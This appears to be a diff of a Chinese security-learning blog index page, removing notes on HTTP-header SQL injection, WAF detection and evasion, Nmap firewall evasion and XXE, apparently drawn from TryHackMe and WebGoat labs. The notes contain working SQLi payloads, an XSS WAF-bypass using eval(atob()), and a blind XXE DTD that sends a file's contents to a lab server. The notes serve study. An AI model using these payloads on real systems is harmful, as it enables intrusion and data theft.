-<li><strong>第一步：询问“根域名服务器”</strong> DNS 问：“哪里能找到 .com 区域？” 根服务器回答：“我知道，去 .com 的顶级域名服务器找。”</li>
-<li><strong>第二步：询问 .com 顶级域名服务器</strong> DNS 问：“哪里能找到 hacker.com？” .com 服务器查了查档案（黑客注册域名时的记录），回答：“这个域名被黑客买下了，他自己搭了一台<strong>权威 DNS 服务器</strong>来管理，IP 是 X.X.X.X。你去问他吧！”</li>
-<li><strong>第三步：致命的一步，流量直接进入黑客的服务器</strong> 全球的 DNS 系统于是转头去问黑客的这台服务器（X.X.X.X）：“喂，你家主人买的 hacker.com 下面，有一个叫 <strong>security</strong> 的子域名，它的 IP 是多少？”</li>
-</ol>
-<p>http标头注入</p>
-<p><strong>场景：</strong> 很多网站为了做数据统计，会记录每一个访问者的浏览器版本。</p>
-<p>User-Agent 标头注入</p>
-<p>后端代码写成了这样:</p>
-<p><img src="/2026/06/11/sql/sql1.png" alt="截图"></p>
-<p>User-Agent: ‘ AND updatexml(1, concat(‘~’, database()), 1) AND ‘1’&#x3D;’1</p>
-<p>INSERT INTO login_log (user_agent, ip) VALUES (‘’ AND updatexml(1, concat(‘~’, database()), 1) AND ‘1’&#x3D;’1’, ‘127.0.0.1’)</p>
-<p>X-Forwarded-For 或 Client-IP 标头注入（伪造 IP 地址）</p>
-<p><strong>场景：</strong> 很多网站有防刷机制、或者登录日志系统，需要记录用户的真实 IP。 因为有很多用户使用代理服务器，程序员会去读取 HTTP 头部专门记录代理路径的字段——X-Forwarded-For（简称 XFF）。</p>
-<p>其实就是更改标头字段，写正常sql注入语句就好了。</p>
-<p>Cookie 标头注入（劫持身份令牌）</p>
-<p><strong>场景：</strong> 网站为了维持你的登录状态，会给浏览器发一串 Cookie。很多时候，后端在验证你的权限或者记录浏览历史时，会去数据库里查这个 Cookie。</p>
-<p>像这样</p>
-<p>SELECT * FROM sessions WHERE session_id &#x3D; ‘用户请求里的Cookie’</p>
-<p>Cookie: sess_id&#x3D;abc’ AND sleep(5) – - 网站突然卡了5秒就说明可以注入了</p>
-<p>Referer 标头注入（追踪来源网页）</p>
-<p><strong>场景：</strong> 网站想统计用户是从哪个外部链接跳过来的（比如是从百度还是从谷歌），就会读取 Referer 标头，并存入数据库。</p>
-<p>具体注入具体分析</p>
-<p>一些绕过方法:</p>
-<p>1.大小写绕过uNiOn啥的</p>
-<p>2.双写绕过UUNiioon</p>
-<p>3.特殊编码绕过</p>
-<p>4.两个空格 Tab</p>
-<p>5.注释 &#x2F;**&#x2F;像这样的空注释</p>
-<p>参考文章: <a target="_blank" rel="noopener" href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/</a></p>
-<p><a target="_blank" rel="noopener" href="https://windeskybb.work/archives/67cd1c1b-3998-4182-be62-a4fc6aca43f3">https://windeskybb.work/archives/67cd1c1b-3998-4182-be62-a4fc6aca43f3</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/11/encoding/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/11/encoding/" class="post-title-link" itemprop="url">编码</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-06-11 16:20:00 / 修改时间：19:12:03" itemprop="dateCreated datePublished" datetime="2026-06-11T16:20:00+08:00">2026-06-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><em><strong>为什么要编码</strong></em></p>
-<p>为了区分特殊字符在特定情况下的意思不同，例如HTML中的<code>&lt;</code>他是一个标签的开始，但也可以是小于的意思，为了区分就会使用编码，像这样<code>&amp;lt;</code>，编码以后就是字面意思了。</p>
-<p><em><strong>用编码绕过</strong></em></p>
-<p>例如我们想要绕过WAF，就sql注入代码进行编码，WAF看到的是编码后的字面量，WAF没有识别出来，到了服务器又将这个编码给解码了，将解码后的拼接以后将sql语句进行解析。编码和解码是相对应的，如果我们编码以后的数据不被解码就没办法发挥了。</p>
-<p>以后再做补充</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/10/waf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/10/waf/" class="post-title-link" itemprop="url">WAF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-06-10 20:32:07" itemprop="dateCreated datePublished" datetime="2026-06-10T20:32:07+08:00">2026-06-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-11 15:23:08" itemprop="dateModified" datetime="2026-06-11T15:23:08+08:00">2026-06-11</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Web-Application-Firewall-WAF"><a href="#Web-Application-Firewall-WAF" class="headerlink" title="Web Application Firewall(WAF)"></a>Web Application Firewall(WAF)</h2><p><em><strong>用途</strong></em></p>
-<p>检查HTTP(S)流量，包括入站和出站流量，检测出有恶意意图的流量。主要解决OWASP Top 10 Web安全问题。</p>
-<p><em><strong>检查</strong></em></p>
-<p>无论怎么样肯定得知道有没有WAF吧。下面我列举一些检查是否有WAF的方法</p>
-<p>一些WAF在HTTP标头中的形式</p>
-<p>server: cloudflare	Cloudflare</p>
-<p>X-Sucuri-ID	Sucuri</p>
-<p>X-CDN: Imperva	Incapsula&#x2F;Imperva</p>
-<p>Akami-Origin-Hop: 2	Akamai</p>
-<p>X-F5-Application: ASM	F5 Advanced WAF</p>
-<p>检测方法1: 很简单就是看HTTP标头 curl -I <a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a></p>
-<p>检测方法2: ‘ OR ‘1’&#x3D;’1 – 是很典型的sql注入，可以想到是个WAF就会对他进行处理，而我们要做的就是这样的sql注入，然后看他的反应。</p>
-<p>例如 curl -I <a target="_blank" rel="noopener" href="https://example.com/q=1">https://example.com/q=1</a>‘ %20OR%20‘1’&#x3D;‘1 对空格编码</p>
-<p>如果返回的是 HTTP&#x2F;1.1 403 Forbidden这样的说明有WAF</p>
-<table>
-<thead>
-<tr>
-<th>回复</th>
-<th align="left">意思</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>403 Forbidden 空白页</td>
-<td align="left">经典的WAF块</td>
-</tr>
-<tr>
-<td>406 Not Acceptable</td>
-<td align="left">ModSecurity CRS中的常见情况</td>
-</tr>
-<tr>
-<td>自定义 HTML页面，显示“拒绝访问”</td>
-<td align="left">厂商特定(例如 Fortinet,Barracuda)</td>
-</tr>
-<tr>
-<td>响应延迟(&gt;500ms)</td>
-<td align="left">WAF开销</td>
-</tr>
-<tr>
-<td>与正常搜索一样</td>
-<td align="left">可能没有WAF</td>
-</tr>
-</tbody></table>
-<p>检测方法3: 用工具wafw00f</p>
-<p>wafw00f <a target="_blank" rel="noopener" href="https://example.com/">https://example.com</a></p>
-<p>用nmap </p>
-<p>Nmap -p 80,443 –script http-waf-fingerprint target_IP</p>
-<p>tryhackme说是wafw00f更好</p>
-<p><em><strong>类型</strong></em></p>
-<p>1.基于特征的</p>
-<p>将数据包与已知的恶意特征码列表进行比较，有效性取决于恶意特征码数据库。</p>
-<p>规避方法</p>
-<p>编码: 跟我上面写的sql注入一样，编码空格啥的</p>
-<p>大小写: uNiOn sELeCt 像这样</p>
-<p>插入注释: 插入注释</p>
-<p>更换语法: 1’ and sleep(5) –	1’ and if(1&#x3D;1, sleep(5), 1) –</p>
-<p>优点: 低误报率(误报率就是将正常流量识别为恶意流量)，易于编写和理解，检测速度快</p>
-<p>缺点: 难以识别混淆手段(上述规避方法)，无法检测零日攻击，需要不断更新</p>
-<p>2.检测行为</p>
-<p>经过训练的引擎，建立一个正常基线，偏离了这个基线就是不正常的流量。</p>
-<p>优点: 可以防止零日漏洞，用简单的编码方式更难绕过，随着时间推移适应应用程序逻辑</p>
-<p>缺点: 误报率高，需要培训期，计算成本高昂</p>
-<p><em><strong>局限性</strong></em></p>
-<p>WAF不理解应用程序逻辑</p>
-<p>以IDOR漏洞举例，GET &#x2F;api&#x2F;user&#x2F;123 我们把123改成124是恶意行为但是WAF不会拦截。因为&#x2F;api&#x2F;user&#x2F;124本身是很正常的，他变得不安全是因为访问这个地址的人的身份。</p>
-<p>授权绕过: 例如&#x2F;admin,无需管理员权限就可以访问</p>
-<p>静态条件和重放攻击</p>
-<p>加密流量也不行，加密了所以看不到流量了。</p>
-<p>客户端攻击难以察觉，例如给予DOM的XSS攻击，这个是传客户端攻击，流量不会到服务器。</p>
-<p>错误的配置引入新的攻击面</p>
-<p>占据资源，需要考虑性能</p>
-<p><em><strong>Version 3.3.5 of OWASP CRS</strong></em></p>
-<p>相关文章: <a target="_blank" rel="noopener" href="https://github.com/coreruleset/coreruleset/issues/2512">https://github.com/coreruleset/coreruleset/issues/2512</a></p>
-<p>有XSS漏洞</p>
-<p>让javascript:关键字生效</p>
-<p><code>jav&amp;#x0D;ascript:</code></p>
-<p>让<code>:</code>生效</p>
-<p><code>jav&amp;#x0D;ascript&amp;colon;</code></p>
-<p>可以使用Unicode进行编码，对一些函数进行混淆。</p>
-<p>对eval(),atom()进行混淆</p>
-<p><code>\u0065val()</code></p>
-<p><code>\u0061tob()</code></p>
-<p>综上使用方法<code>&lt;a href=jav&amp;#x0D;ascript&amp;colon;\u0065val(\u0061tob(&quot;Base64编码的字符串&quot;));&gt;xxx&lt;/a&gt;</code></p>
-<p>说明:</p>
-<p>Javascript:开头时，会直接在当前页面的上下文中，把冒号后面的内容当作javascript代码来执行</p>
-<p><code>&amp;#x0D;</code>,<code>&amp;colon;</code>是html实体编码</p>
-<p>eval()将接收到的字符串当作javascript代码来执行</p>
-<p>atob(): 将一段经过Base64编码的字符串，解码为原始的二进制字符串。</p>
-<p>总之就是把药执行的代码进行Base64编码然后放进去就好了。</p>
-<p>参考文章: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/wafintroduction">https://tryhackme.com/room/wafintroduction</a></p>
-<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/wafexploitationtechniques">https://tryhackme.com/room/wafexploitationtechniques</a></p>
-<p> <a target="_blank" rel="noopener" href="https://github.com/coreruleset/coreruleset/issues/2512">https://github.com/coreruleset/coreruleset/issues/2512</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/10/FireWall/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/10/FireWall/" class="post-title-link" itemprop="url">FireWall</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-06-10 14:42:54 / 修改时间：17:02:26" itemprop="dateCreated datePublished" datetime="2026-06-10T14:42:54+08:00">2026-06-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="防火墙规避"><a href="#防火墙规避" class="headerlink" title="防火墙规避"></a>防火墙规避</h3><blockquote>
-<p>以下使用的是Nmap</p>
-</blockquote>
-<p><em><strong>控制MAC,IP,端口进行规避</strong></em></p>
-<p>1.利用诱饵，将自己的IP与其他IP混杂在一起 -D DECOY_IP1,DECOY_IP2,ME</p>
-<p>2.随机诱饵, -D RND,RND,ME</p>
-<p>3.HTTP&#x2F;SOCK4代理 –proxies PROXY_URL</p>
-<p>4.伪造源MAC地址 –spoof-mac MAC_ADDRESS</p>
-<p>5.伪造源IP地址 -S IP_ADDRESS</p>
-<p>6.使用特定的端口号 -g PORT_NUM 或者 –source-port PORT_NUM       </p>
-<p><em><strong>强制分片，MTU，数据长度</strong></em></p>
-<blockquote>
-<p>⚠️  <strong>注意: 分的数据都是数据体的部分，例如IP数据包，由IP首部和传输的数据部分组成，分成8字节只是将传输的数据部分分成8字节，因为没有IP首部就没办法传了。一下1、2、3、4都是如此</strong></p>
-</blockquote>
-<p>1.将IP数据分片成8字节 -f</p>
-<p>2.将IP数据分片成16字节 -ff</p>
-<p>3.使用给定的MTU对数据包进行分片 –mtu VALUE</p>
-<p>4.指定数据包长度 –data-length NUM</p>
-<p><em><strong>修改报头字段进行规避</strong></em></p>
-<p>1.设置IP的ttl –ttl VALUE</p>
-<p>2.发送带有特定IP Options的数据包 –ip-options OPTIONS</p>
-<p>3.发送带有错误TCP&#x2F;UDP校验和的数据包 –badsum</p>
-<p><img src="/2026/06/10/FireWall/firewall1.png" alt="IP头部"></p>
-<p>也就是修改Time to Live和Options</p>
-<p><img src="/2026/06/10/FireWall/firewall2.png" alt="TCP头部"></p>
-<p>改的Checksum</p>
-<p><em><strong>利用端口跳跃</strong></em></p>
-<blockquote>
-<p>我是在tryhackme上学的这部分，没太看懂，下面这个是我文AI知道的。</p>
-</blockquote>
-<p>这是在控制了对方的服务器的情况下，防止因为频繁的流量交流被防火墙检测到。</p>
-<p>端口跳跃就是在防火墙允许的端口间频繁切换(时间很短)，从而防止长时间在固定端口上交流。</p>
-<p>有两种方式</p>
-<p>1.基于时间&#x2F;算法同步</p>
-<p>通信的两端共享一个<strong>密钥</strong>和<strong>时间同步算法</strong>。算法决定“在第 1 毫秒用 5001 端口，第 2 毫秒用 6234 端口，第 3 毫秒用 4012 端口….</p>
-<p>2.敲暗号</p>
-<p>服务端的所有端口默认全部<strong>死死关闭</strong>，防火墙对其显示为 <code>Filtered</code></p>
-<p>客户端在建立真正连接前，必须先向服务端一连串指定的端口发送特定序列的探测包。</p>
-<p>例如暗号是：先踩一下 <code>1111</code>，再踩一下 <code>9999</code>，最后踩一下 <code>5555</code>。</p>
-<p>服务端的内核态（或敲门守护进程）一旦捕捉到这个特定序列的“暗号”，就会临时为这个特定的客户端 IP 开启真正的通信端口。通信完后，立刻再度关闭。也就是说我放进去的后门可以看到流量被拒绝了，一看到一串的特定流量被拒绝了就打开端口。</p>
-<p><em><strong>利用端口隧道</strong></em></p>
-<p>还是控制了对方的服务器的情况下。我想要吧流量送到对方的另一台服务器上，或者是这台受控机器的另一个端口(我们的流量没有办法直接传过去，防火墙挡掉了)。防火墙阻止来自不信任网络的80端口流量，但是8008的流量并未被阻止。我们可以把流量发到受控机器的8008端口，再让他把流量转发给另一个机器或端口。</p>
-<p>后续可能会进行补充</p>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://tryhackme.com/room/redteamfirewalls">https://tryhackme.com/room/redteamfirewalls</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/10/XXE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/10/XXE/" class="post-title-link" itemprop="url">学习XXE</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-06-10 09:21:37 / 修改时间：14:19:12" itemprop="dateCreated datePublished" datetime="2026-06-10T09:21:37+08:00">2026-06-10</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><em>XML external entity injection</em></p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>有这种漏洞就是因为后端对xml没有限制，具体是什么限制后面写，所以说利用的肯定是xml的一些语法特性。</p>
-<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>但其实就是DTD部分</p>
-<p><img src="/2026/06/10/XXE/xxe1.png" alt="截图"></p>
-<p>主要关注DTD</p>
-<p>在[]里面有ENTITY js “Jo Smith”</p>
-<p>js就是变量 Jo Smith就是变量的值</p>
-<p>&amp;js 就会变成Jo Smith</p>
-<p><img src="/2026/06/10/XXE/xxe2.png" alt="截图"></p>
-<p>主要关注SYSTEM</p>
-<p>SYSTEM 是一个<strong>强力关键字</strong>，它的核心作用就是：<strong>告诉 XML 解析器去“外包”或者“搬运”外部的资源</strong>。</p>
-<p>也就是说它会从后面附上的地址那数据。</p>
-<p>也就说&amp;js会得到&#x2F;etc&#x2F;passwd这个文件里面的数据。</p>
-<p>而这个xml是传给后端的，所以这个文件就是后端的文件。</p>
-<p>很显然这个SYSTEM关键字是不安全的应该禁止</p>
-<h3 id="变量的两种形式"><a href="#变量的两种形式" class="headerlink" title="变量的两种形式"></a>变量的两种形式</h3><ul>
-<li><p>通用实体</p>
-<p><img src="/2026/06/10/XXE/xxe3.png" alt="截图"></p>
-</li>
-</ul>
-<p>也就是我们在刚才一直用的形式，如图file就是变量</p>
-<p>他的变量在DTD中是不会解析的</p>
-<ul>
-<li><p>参数实体</p>
-<p><img src="/2026/06/10/XXE/xxe4.png" alt="截图"></p>
-</li>
-</ul>
-<p>先看对变量进行定义的方法，他是通过&amp; 变量名 的形式定义的（注意&amp;和变量名之间有空格）</p>
-<p>对于变量的引用是通过&amp;变量名。</p>
-<p>核心就是，变量的引用是在DTD里进行的。</p>
-<p>那这个参数实体在哪里会用到呢？</p>
-<p>他会在XXE盲注中用到</p>
-<p>首先了解一下什么是盲注，盲注就是没有回显。</p>
-<p>举个例子，上面的例子中的&#x2F;etc&#x2F;passwd文件里面的数据我们希望看到，比如说显示在前端页面什么的，但是对方后端在处理完之后没有将数据传给前端，或者只显示xml解析成功之类的，总之我们看不到数据。</p>
-<p>所以我们希望可以看到数据，既然对方的前端页面不会显示数据，我们就让他把数据传给我们，如图</p>
-<p><img src="/2026/06/10/XXE/xxe5.png" alt="截图"></p>
-<p>这个webwolf就是我们的服务器</p>
-<p>%file获取数据，添加给send的值里面</p>
-<p>%send就会将这个http协议给解析了，也就是访问这个http地址，这样我们的服务器就可以通过参数的形式看到数据了。</p>
-<p>但是，参数实体在变量的值里面是不能这么写的，因为xml解析器看到这种语法的话会直接报错罢工，也就是说%file没用。</p>
-<p>还有但是，在外部 DTD 文件（即通过网络或者本地路径引入的独立 .dtd 文件）中，参数实体允许进行自由的嵌套、拼接和调用。</p>
-<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-2025.3/XXE/ctwabc/secret.txt">
-
-<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://webwolf:9090/WebWolf/landing?text=%file;'><p>“&gt;</p>
-<p>%all;</p>
-<p>%send;</p>
-<p>这个是外部DTD文件里面的内容，在这里可以随意嵌套。</p>
-<p><img src="/2026/06/10/XXE/xxe6.png" alt="截图"></p>
-<p>那就可以像这样使用了。还有一个疑问就是%remote后那个DTD不就在内部了吗，内部不是不能嵌套吗，可以这样写吗？</p>
-<p>可以的，因为解析起在解析的时候看到%remote他的内容是从外部过来的，就会对他进行标记，这样就允许他进行嵌套了。</p>
-<p>可以想到用XXE执行SSRF</p>
-<p>把url地址改成内网地址不就是SSRF吗。</p>
-<p>至于在内网当中的ip是什么，端口是什么，可以通过爆破来解决。</p>
-<p>参考文章: </p>
-<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/06/11/paddingoracle/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1266,7 +543,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
